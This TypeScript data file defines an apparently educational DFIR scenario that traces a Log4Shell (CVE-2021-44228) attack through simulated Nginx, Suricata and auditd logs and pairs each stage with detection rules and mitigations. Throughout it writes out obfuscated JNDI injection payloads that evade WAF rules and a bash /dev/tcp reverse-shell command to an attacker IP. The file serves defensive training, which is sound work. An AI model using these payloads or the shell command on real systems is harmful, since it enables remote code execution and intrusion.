import { AttackScenario } from './types';

export const LOG4SHELL_SCENARIO: AttackScenario = {
  id: 'log4shell-dfir',
  code: 'CVE-2021-44228',
  name: 'Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)',
  shortSubtitle: 'Log Analysis · Web Access Logs, Rogue LDAP, Java Spawning Bash & Auditd',
  category: 'LOG_ANALYSIS',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview: 'In CVE-2021-44228 (Log4Shell), Apache Log4j2 recursively evaluates JNDI lookup expressions embedded inside logged strings. An attacker injects ${jndi:ldap://...} inside an HTTP header (such as User-Agent). When the Java application logs the request, Log4j performs an outbound LDAP query to the attacker server, downloads a malicious Java bytecode class, and spawns an interactive reverse shell under the java process.',
  specs: [
    { term: 'CVE / MITRE ID', value: 'CVE-2021-44228 · T1190 (Exploit Public-Facing App)' },
    { term: 'VULNERABLE COMPONENT', value: 'org.apache.logging.log4j:log4j-core (2.14.1)' },
    { term: 'LOG SOURCES ANALYZED', value: 'Nginx Access.log, Suricata IDS, Linux Auditd (SYSCALL/EXECVE)' },
    { term: 'PROTOCOLS', value: 'HTTP (8080) → LDAP (1389) → HTTP Class Loader (8888) → TCP Shell (4444)' },
    { term: 'TARGET SERVER', value: 'app-prod-01 (10.20.1.15 · Ubuntu 22.04 LTS)' },
  ],
  nodes: [
    {
      id: 'attacker_scanner',
      label: 'Attacker Exploit Node',
      sublabel: '91.214.124.88',
      role: 'attacker',
      x: 15,
      y: 35,
      details: {
        osOrType: 'External Threat Actor',
        pidOrPort: 'Source IP: 91.214.124.88',
        privilege: 'External Untrusted',
        artifacts: ['Header: X-Api-Version / User-Agent', 'Payload: ${jndi:ldap://91.214.124.88:1389/Basic/Command}'],
        description: 'External attacker dispatching crafted HTTP requests containing obfuscated JNDI lookup strings.' } },
    {
      id: 'nginx_waf',
      label: 'Nginx Reverse Proxy',
      sublabel: '10.20.1.10:443',
      role: 'firewall_siem',
      x: 38,
      y: 48,
      details: {
        osOrType: 'Nginx 1.24 + Access Log',
        pidOrPort: '/var/log/nginx/access.log',
        privilege: 'DMZ Ingress Proxy',
        artifacts: ['GET /api/v1/login HTTP/1.1', 'User-Agent: ${${lower:j}ndi:${lower:l}dap://...}'],
        description: 'Ingress reverse proxy logging the raw HTTP request in access.log before forwarding to the Java backend.' } },
    {
      id: 'spring_java',
      label: 'Spring Boot (Log4j2)',
      sublabel: '10.20.1.15 · PID 1420',
      role: 'server',
      x: 60,
      y: 40,
      details: {
        osOrType: 'Java 11 (log4j-core 2.14.1)',
        pidOrPort: 'PID 1420 (User: tomcat)',
        privilege: 'Service Account (tomcat)',
        artifacts: ['logger.info("Failed login from UA: " + userAgent)', 'JndiLookup.lookup() triggered'],
        description: 'Vulnerable Java microservice whose Log4j2 logger evaluates the JNDI string and initiates an outbound LDAP connection.' } },
    {
      id: 'rogue_ldap',
      label: 'Rogue LDAP & HTTP',
      sublabel: '91.214.124.88:1389',
      role: 'attacker',
      x: 85,
      y: 25,
      details: {
        osOrType: 'JNDIExploit / Marshalsec Server',
        pidOrPort: 'TCP/1389 (LDAP) & TCP/8888 (HTTP)',
        privilege: 'Attacker Infrastructure',
        artifacts: ['javaCodeBase: http://91.214.124.88:8888/', 'javaFactory: Exploit'],
        description: 'Attacker-controlled LDAP referral server directing the victim JVM to load and instantiate Exploit.class over HTTP.' } },
    {
      id: 'auditd_siem',
      label: 'Linux Auditd & SIEM',
      sublabel: 'SYSCALL execve /bin/bash',
      role: 'firewall_siem',
      x: 82,
      y: 72,
      details: {
        osOrType: 'Linux Kernel Auditd + Elastic SIEM',
        pidOrPort: '/var/log/audit/audit.log',
        privilege: 'Root Kernel Telemetry',
        artifacts: ['type=EXECVE a0="/bin/sh" a1="-c" a2="bash -i >& /dev/tcp/..."', 'ppid=1420 (java)'],
        description: 'Linux Audit daemon capturing the exact execve system call where the Java process spawns /bin/sh and establishes a reverse shell.' } },
  ],
  processTree: [
    {
      pid: 1,
      ppid: 0,
      name: 'systemd',
      commandLine: '/sbin/init',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['clone'] },
    {
      pid: 1420,
      ppid: 1,
      name: 'java',
      commandLine: '/usr/bin/java -jar /opt/app/billing-service.jar',
      user: 'tomcat',
      integrity: 'Medium',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'org.apache.logging.log4j.core.lookup.JndiLookup',
        'javax.naming.InitialContext.lookup("ldap://91.214.124.88:1389/Exploit")',
        'java.net.URLClassLoader.findClass("Exploit")',
        'java.lang.Runtime.getRuntime().exec()',
      ] },
    {
      pid: 8912,
      ppid: 1420,
      name: '/bin/sh',
      commandLine: '/bin/sh -c bash -i >& /dev/tcp/91.214.124.88/4444 0>&1',
      user: 'tomcat',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 4,
      apiCalls: ['execve("/bin/bash")', 'dup2(sock, 0)', 'dup2(sock, 1)', 'connect(91.214.124.88:4444)'] },
  ],
  stages: [
    {
      index: 1,
      title: 'INJECT JNDI PAYLOAD IN HTTP HEADER',
      subtitle: 'Obfuscated User-Agent bypasses basic WAF signature',
      description: 'The attacker sends an HTTP request carrying `${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}` in the User-Agent header. Nested lookups like `${lower:j}` evade naive string-matching WAF rules. Nginx records the raw request in /var/log/nginx/access.log and forwards it to the Spring Boot backend.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['attacker_scanner', 'nginx_waf', 'spring_java'],
      compromisedNodeIds: ['attacker_scanner'],
      keySpecs: [
        { term: 'INJECTION VECTOR', value: 'HTTP Header: User-Agent / X-Api-Version' },
        { term: 'WAF BYPASS', value: '${${lower:j}ndi:${lower:l}dap://...}' },
        { term: 'LOG ARTIFACT', value: '/var/log/nginx/access.log' },
      ] },
    {
      index: 2,
      title: 'LOG4J JNDI EVALUATION & OUTBOUND LDAP',
      subtitle: 'JndiManager initiates TCP/1389 connection to rogue LDAP',
      description: 'When the Java application logs the request via logger.info(), Log4j2 parses the ${jndi:ldap://...} token and invokes JndiManager.lookup(). The server initiates an outbound TCP connection on port 1389 to 91.214.124.88. In network logs (Zeek/Suricata), an internal web server initiating outbound LDAP to an external IP is a high-fidelity indicator.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1203',
      mitreTechniqueName: 'Exploitation for Client/Server Execution',
      activeNodeIds: ['spring_java', 'rogue_ldap'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java'],
      keySpecs: [
        { term: 'JAVA CLASS', value: 'org.apache.logging.log4j.core.net.JndiManager' },
        { term: 'OUTBOUND CONN', value: '10.20.1.15:49210 → 91.214.124.88:1389 (LDAP)' },
        { term: 'NETWORK ANOMALY', value: 'DMZ Web Server making external LDAP query' },
      ] },
    {
      index: 3,
      title: 'LDAP REFERRAL & REMOTE CLASS LOADING',
      subtitle: 'JVM fetches http://91.214.124.88:8888/Exploit.class',
      description: 'The rogue LDAP server responds with a JNDI Reference entry specifying javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit". The victim JVM automatically issues an HTTP GET request to download Exploit.class (magic bytes 0xCAFEBABE) and executes its static initializer block.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1105',
      mitreTechniqueName: 'Ingress Tool Transfer (Remote Class Load)',
      activeNodeIds: ['spring_java', 'rogue_ldap'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java', 'rogue_ldap'],
      keySpecs: [
        { term: 'LDAP ATTRIBUTE', value: 'javaCodeBase: http://91.214.124.88:8888/' },
        { term: 'STAGE 2 PAYLOAD', value: 'Exploit.class (Java Bytecode 0xCAFEBABE)' },
        { term: 'EXECUTION SINK', value: 'Runtime.getRuntime().exec(String[] cmd)' },
      ] },
    {
      index: 4,
      title: 'JAVA SPAWNS /BIN/BASH REVERSE SHELL',
      subtitle: 'Linux Auditd captures java (PID 1420) spawning /bin/sh',
      description: 'The static block inside Exploit.class invokes Runtime.getRuntime().exec() to spawn a reverse shell to 91.214.124.88:4444. On the host, Linux Auditd (/var/log/audit/audit.log) records a SYSCALL event (syscall=59 execve) showing parent process java (PID 1420) executing /bin/sh.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['spring_java', 'auditd_siem', 'attacker_scanner'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java', 'rogue_ldap'],
      keySpecs: [
        { term: 'LINUX SYSCALL', value: 'syscall=59 (sys_execve) · ppid=1420 (java)' },
        { term: 'SHELL COMMAND', value: 'bash -i >& /dev/tcp/91.214.124.88/4444 0>&1' },
        { term: 'EFFECTIVE USER', value: 'uid=1001(tomcat) gid=1001(tomcat)' },
      ] },
  ],
  telemetry: [
    {
      id: 'l4s-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:22:01.040',
      sourceNodeId: 'attacker_scanner',
      targetNodeId: 'nginx_waf',
      sourceLabel: '91.214.124.88',
      targetLabel: '10.20.1.10 (Nginx)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'Nginx Access Log',
      shortAction: 'HTTP JNDI',
      info: 'POST /api/v1/login UA="${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}"',
      sizeOrCode: 'HTTP 401',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation: 'The Nginx access.log shows the attacker injecting an obfuscated JNDI expression in the User-Agent header. Even though login failed with HTTP 401, the backend logged the failed attempt along with the User-Agent string, triggering the vulnerability!',
      rawLog: `91.214.124.88 - - [12/Nov/2026:14:22:01 +0000] "POST /api/v1/login HTTP/1.1" 401 142 "-" "\${\${lower:j}ndi:\${lower:l}dap://91.214.124.88:1389/Exploit}" "-"

# Application Log (/var/log/billing-service/app.log):
2026-11-12 14:22:01.045 WARN [http-nio-8080-exec-4] com.corp.auth.LoginController - Failed login attempt for user 'admin' from User-Agent: \${\${lower:j}ndi:\${lower:l}dap://91.214.124.88:1389/Exploit}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Log4Shell Exploitation Attempt in Web Access Logs',
        ruleCode: `title: Log4Shell CVE-2021-44228 Web Log Detection
logsource:
  category: webserver
detection:
  selection:
    cs-user-agent|contains:
      - '\${jndi:'
      - '\${lower:'
      - '\${upper:'
      - ':ldap://'
      - ':rmi://'
  condition: selection
level: critical`,
        mitigation: 'Upgrade Log4j2 to >= 2.17.1, set -Dlog4j2.formatMsgNoLookups=true, and block nested ${...} lookup patterns at the WAF.' } },
    {
      id: 'l4s-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:22:01.190',
      sourceNodeId: 'spring_java',
      targetNodeId: 'rogue_ldap',
      sourceLabel: '10.20.1.15 (Java)',
      targetLabel: '91.214.124.88:1389',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata / Zeek',
      shortAction: 'LDAP QUERY',
      info: 'LDAP SearchRequest BaseObject="Exploit" Scope=baseObject',
      sizeOrCode: '118 B',
      severity: 'HIGH',
      mitreId: 'T1203',
      explanation: 'Network telemetry confirms the internal server (10.20.1.15) initiated an outbound LDAP SearchRequest to 91.214.124.88:1389. In DFIR triage, outbound LDAP/RMI traffic proves the vulnerability was successfully triggered rather than merely scanned.',
      rawLog: `{
  "timestamp": "2026-11-12T14:22:01.190Z",
  "event_type": "alert",
  "src_ip": "10.20.1.15",
  "src_port": 49210,
  "dest_ip": "91.214.124.88",
  "dest_port": 1389,
  "proto": "TCP",
  "alert": {
    "signature": "ET EXPLOIT Apache Log4j RCE Outbound LDAP SearchRequest",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "ldap": {
    "operation": "SearchRequest",
    "base_object": "Exploit"
  }
}`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Outbound LDAP Connection from DMZ Server',
        ruleCode: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"SOC DFIR Outbound Unencrypted LDAP SearchRequest to Internet";
  flow:established,to_server;
  content:"|30|"; depth:1;
  content:"|63|"; distance:1; within:6;
  classtype:bad-unknown; sid:9001042; rev:1;
)`,
        mitigation: 'Enforce strict Egress Firewall filtering on DMZ application servers to block unauthorized outbound connections.' } },
    {
      id: 'l4s-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:22:01.410',
      sourceNodeId: 'rogue_ldap',
      targetNodeId: 'spring_java',
      sourceLabel: '91.214.124.88:8888',
      targetLabel: '10.20.1.15 (Java)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP ClassLoad',
      shortAction: 'Exploit.class',
      info: 'HTTP/1.1 200 OK (application/java-vm) -> Magic: 0xCAFEBABE',
      sizeOrCode: '1.8 KB',
      severity: 'CRITICAL',
      mitreId: 'T1105',
      explanation: 'Following the LDAP Reference response, the victim JVM requests http://91.214.124.88:8888/Exploit.class using User-Agent "Java/11.0.11" and loads the returned 0xCAFEBABE bytecode.',
      rawLog: `GET /Exploit.class HTTP/1.1
User-Agent: Java/11.0.11
Host: 91.214.124.88:8888
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 1842

CA FE BA BE 00 00 00 37 00 34 0A 00 0B 00 1C 08  .......7.4......
00 1D 0A 00 1E 00 1F 07 00 20 07 00 21 01 00 06  ......... ..!...
<Decompiled: Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","bash -i >& /dev/tcp/91.214.124.88/4444 0>&1"});>`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Java Bytecode (0xCAFEBABE) Downloaded Over Plain HTTP',
        ruleCode: `alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Java Class Bytecode (CAFEBABE) Downloaded over HTTP";
  flow:established,to_client;
  http.stat_code; content:"200";
  file.data; content:"|CA FE BA BE|"; depth:4;
  classtype:trojan-activity; sid:2034651; rev:2;
)`,
        mitigation: 'Ensure JVM remote classloading is disabled via -Dcom.sun.jndi.ldap.object.trustURLCodebase=false.' } },
    {
      id: 'l4s-4',
      no: 4,
      stageIndex: 4,
      timestamp: '14:22:01.680',
      sourceNodeId: 'spring_java',
      targetNodeId: 'auditd_siem',
      sourceLabel: 'java (PID 1420)',
      targetLabel: '/bin/sh (PID 8912)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd EXECVE',
      shortAction: 'SPAWN /BIN/SH',
      info: 'syscall=59(execve) ppid=1420 exe="/usr/bin/dash" a2="bash -i >& /dev/tcp/..."',
      sizeOrCode: 'PID 8912',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation: 'Linux Auditd (/var/log/audit/audit.log) provides definitive forensic proof of RCE: parent PID 1420 (java) invoked execve() to launch /bin/sh redirecting interactive bash stdio to /dev/tcp/91.214.124.88/4444.',
      rawLog: `type=SYSCALL msg=audit(1794493321.680:4821): arch=c000003e syscall=59 success=yes exit=0 a0=7f8b40112a10 a1=7f8b40112a90 a2=7ffd91a04118 a3=0 items=2 ppid=1420 pid=8912 auid=4294967295 uid=1001 gid=1001 euid=1001 tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" key="java_shell_spawn"
type=EXECVE msg=audit(1794493321.680:4821): argc=3 a0="/bin/sh" a1="-c" a2="bash -i >& /dev/tcp/91.214.124.88/4444 0>&1"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Java Process Spawning Interactive Linux Shell',
        ruleCode: `title: Java Application Spawning Shell Process
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/java'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
  condition: selection
level: critical`,
        mitigation: 'Configure Auditd rules on execve for web service UIDs and restrict child process spawning via AppArmor or SELinux profiles.' } },
  ] };
